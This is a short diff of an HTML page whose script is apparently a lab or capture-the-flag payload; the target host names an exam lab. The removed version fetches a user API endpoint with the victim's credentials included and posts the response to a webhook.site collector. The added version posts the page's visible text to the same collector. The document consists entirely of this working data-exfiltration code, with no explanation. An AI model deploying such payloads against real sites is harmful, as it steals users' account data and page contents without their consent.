@@ -2,16 +2,10 @@
 <html>
   <body>
     <script>
-      fetch("https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/user", {
-        credentials: "include"
-      })
-      .then(res => res.text())
-      .then(data => {
-        fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: "data=" + encodeURIComponent(data)
-        });
+      fetch("https://webhook.site/c8da1079-71fd-4a7a-9869-fcf75dfd6c66", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "html=" + encodeURIComponent(document.body.innerText)
       });
     </script>
   </body>
